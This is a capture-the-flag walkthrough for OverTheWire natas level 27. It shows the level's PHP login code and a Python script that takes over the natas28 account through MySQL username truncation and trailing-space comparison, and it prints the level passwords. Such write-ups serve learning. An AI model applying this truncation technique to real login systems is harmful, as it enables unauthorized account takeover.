---
title: natas 27 walkthrough
description: over the wire natas 27
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-27 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 27 walkthrough
    order: 30
---
## Description
> Username: natas27
> 
> URL:      http://natas27.natas.labs.overthewire.org

### Source Code
```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link, $usr, $pass)
{

    $user = mysqli_real_escape_string($link, $usr);
    $password = mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if (mysqli_num_rows($res) > 0) {
        return True;
    }
    return False;
}


function validUser($link, $usr)
{

    $user = mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link, $usr)
{

    $user = mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row, true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass)
{

    if ($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user = mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password = mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if (mysqli_affected_rows($link) > 0) {
        return True;
    }
    return False;
}


if (array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if (validUser($link, $_REQUEST["username"])) {
        //user exists, check creds
        if (checkCredentials($link, $_REQUEST["username"], $_REQUEST["password"])) {
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data = dumpData($link, $_REQUEST["username"]);
            print htmlentities($data);
        } else {
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    } else {
        //user doesn't exist
        if (createUser($link, $_REQUEST["username"], $_REQUEST["password"])) {
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
}
```

---
## Progress
### Observation
First, I noticed that sql injection might be prevented by `mysqli_real_escape_string`. While digging information, I found a [stackoverflow discussion](https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string) which is marvelous. It shows the original answer and why the payload was constructed. Back to the topic, refer to that discussion, it seems to be impossible to bypass `mysqli_real_escape_string`.

The last hope would be `htmlentities`. It seems that it can do nothing.
### Get a Hint
From this [natas hint site](https://onestepcode.com/no-solution-natas-guide-overthewire/). It says 
> The username column is not defined as unique

### Plan
All we need to do is construct a username that would be `natas28` when it's store into the database. In other words, we need to meet a few conditions
1. `$usr != trim($usr)`
2. `mysqli_real_escape_string($link, substr($usr, 0, 64)) == 'natas28'`
All the special characters we need can be found at [php manual](https://www.php.net/manual/en/mysqli.real-escape-string.php).
### Pwn
```python
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
authentication = HTTPBasicAuth(username, password)

def get_content(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return content.__str__()

def main():
    main_url = "http://natas27.natas.labs.overthewire.org/"
    payload = {
        "username" : "natas28" + "\0"*63 + "3",
        "password" : "123"
    }
    _ = requests.post(main_url, payload, auth=authentication)
    payload = {
        "username" : "natas28",
        "password" : "123"
    }
    response = requests.post(main_url, payload, auth=authentication)
    print(get_content(response))

main()
```
skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4

### SQL Trailing Spaces
Although I got the password, that was achieved by chance, not a good plan nor clear understanding.

How mySQL treats trailing spaces plays a significant role in this problem. By [the document](https://dev.mysql.com/doc/refman/8.4/en/charset-binary-collations.html#charset-binary-collations-trailing-space-comparisons) and my search,
![[mysql_ascii.png]]
we know
1. For `PAD SPACE` collations, trailing spaces are insignificant in comparisons; strings are compared without regard to trailing spaces.
2. ascii is `PAD SPACE` collations in mysql
Therefore, trailing spaces would be ignored.
![[mysql_trailing_spaces_comparison.png]]

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 